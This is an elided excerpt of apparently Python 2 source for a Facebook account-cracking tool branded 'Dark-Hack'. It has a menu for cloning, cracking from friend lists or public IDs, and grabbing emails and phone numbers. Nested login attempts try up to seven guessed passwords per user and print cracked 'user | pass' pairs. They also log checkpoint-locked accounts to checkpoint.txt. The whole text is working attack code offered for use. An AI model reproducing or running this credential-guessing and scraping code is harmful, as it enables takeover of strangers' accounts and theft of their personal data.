...
def menu():
	...
	print
	print ("[A] Clone Menu")
	print ("[B] Clone With Pass Choice")
	print ("[C] Grab Emails")
	print ("[D] Grab Mobile Numbers")
	print ("[E] Unfriend with one click")
	print ("[F] Update DXI Tool")
...
def action():
	...
	if chb =="":
	    ...
	    os.system("pip2 install --upgrade dxin")
	    cb()
	    print (logo)
	    psb("100%")
...
def crack_menu():
	...
	try:
		...
		token()
	print (logo)
	print ("[A] Crack From Friend List")
	print ("[B] Crack From Any Public ID")
	print ("[C] Crack From File")
	print ("[00] Back")
	print (50*"-")
	crack_action()
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass1
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.load(data)
					if "access_token" in q:
						print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass2
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							q = json.load(data)
							if "access_token" in q:
								print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass3
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.load(data)
									if "access_token" in q:
										print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass4
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.load(data)
											if "access_token" in q:
												print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass5
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													q = json.load(data)
													if "access_token" in q:
														print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass6
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															q = json.load(data)
															if "access_token" in q:
																print "\x1b[1;92m[Dark-Hack]\x1b[0m " + user + " | " + pass7
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q1:
				print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q1["error_msg"]:
					print "[Dark Cp] " + user + " | " + pass1
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"\n")
					cps.close()
					cpb.append(user+pass1)
					...
					if "access_token" in q2:
						print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q2["error_msg"]:
							print "[Dark Cp] " + user + " | " + pass2
							cps = open("checkpoint.txt", "a")
							cps.write(user+"|"+pass2+"\n")
							cps.close()
							cpb.append(user+pass2)
							...
							if "access_token" in q3:
								print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q3["error_msg"]:
									print "[Dark Cp] " + user + " | " + pass3
									cps = open("checkpoint.txt", "a")
									cps.write(user+"|"+pass3+"\n")
									cps.close()
									cpb.append(user+pass3)
									...
									if "access_token" in q4:
										print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q4["error_msg"]:
											print "[Dark Cp] " + user + " | " + pass4
											cps = open("checkpoint.txt", "a")
											cps.write(user+"|"+pass4+"\n")
											cps.close()
											cpb.append(user+pass4)
											...
											if "access_token" in q5:
												print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q5["error_msg"]:
													print "[Dark Cp] " + user + " | " + pass5
													cps = open("checkpoint.txt", "a")
													cps.write(user+"|"+pass5+"\n")
													cps.close()
													cpb.append(user+pass5)
													...
													if "access_token" in q6:
														print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q6["error_msg"]:
															print "[Dark Cp] " + user + " | " + pass6
															cps = open("checkpoint.txt", "a")
															cps.write(user+"|"+pass6+"\n")
															cps.close()
															cpb.append(user+pass6)
															...
															if "access_token" in q7:
																print "\x1b[1;92m[Dark-Hacked]\x1b[0m " + user + " | " + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q7["error_msg"]:
																	print "[Dark Cp] " + user + " | " + pass7
																	cps = open("checkpoint.txt", "a")
																	cps.write(user+"|"+pass7+"\n")
																	cps.close()
																	cpb.append(user+pass7)
